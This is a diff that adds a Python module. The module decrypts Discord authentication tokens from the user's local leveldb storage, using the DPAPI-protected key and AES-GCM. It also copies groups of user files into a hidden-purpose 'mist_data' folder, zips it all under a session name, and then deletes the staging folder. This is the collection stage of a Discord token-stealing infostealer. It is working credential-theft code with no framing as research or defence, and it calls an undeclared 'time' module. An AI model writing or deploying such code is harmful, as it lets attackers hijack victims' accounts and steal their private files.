@@ -1,0 +1,48 @@
+import shutil
+import os
+from re import findall
+import json
+import base64
+import win32crypt
+from Crypto.Cipher import AES
+# end_imports
+
+
+def extract_tokens(path, local_state):
+    tkns = []
+    encPattern = r'dQw4w9WgXcQ:[^\"]*'
+    with open(local_state, 'r') as f:
+        state = f.read()
+    state = json.loads(state)
+    master_key = base64.b64decode(state["os_crypt"]["encrypted_key"])
+    master_key = master_key[5:]
+    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
+    for file_name in os.listdir(path):
+        if file_name[-3:] not in ["log", "ldb"]:
+            continue
+        for line in [x.strip() for x in open(f'{path}/{file_name}', errors='ignore').readlines() if x.strip()]:
+            for y in findall(encPattern, line):
+                enc_token = base64.b64decode(y.split('dQw4w9WgXcQ:')[1])
+                iv = enc_token[3:15]
+                payload = enc_token[15:]
+                cipher = AES.new(master_key, AES.MODE_GCM, iv)
+                decr_token = cipher.decrypt(payload)
+                decr_token = decr_token[:-16].decode()
+                if decr_token + '\n' not in tkns:
+                    tkns.append(decr_token)
+    return tkns
+
+
+def collect_files(paths, session):
+    os.popen('mkdir %USERPROFILE%\\Documents\\mist_data')
+    for group in paths:
+        os.popen(f'mkdir "%USERPROFILE%\\Documents\\mist_data\\{group}"')
+        for file in paths[group]:
+            if os.path.isdir(file.replace('%USERPROFILE%', os.environ["USERPROFILE"])):
+                os.popen(f'robocopy "{file}" "%USERPROFILE%\\Documents\\mist_data\\{group}\\{file.split("\\")[-1]}" /e')
+            else:
+                os.popen(f'copy "{file}" "%USERPROFILE%\\Documents\\mist_data\\{group}\\{file.split("\\")[-1]}"')
+    open(f'{os.environ["USERPROFILE"]}\\Documents\\mist_data\\Discord\\decrypted_tokens', 'w').write(''.join(extract_tokens(f'{os.environ["USERPROFILE"]}\\AppData\\Roaming\\discord\\Local Storage\\leveldb', f'{os.environ["USERPROFILE"]}\\AppData\\Roaming\\discord\\Local State')))
+    shutil.make_archive(session, 'zip', f'{os.environ["USERPROFILE"]}\\Documents\\mist_data')
+    time.sleep(2)
+    os.popen('rmdir /s /q %USERPROFILE%\\Documents\\mist_data')
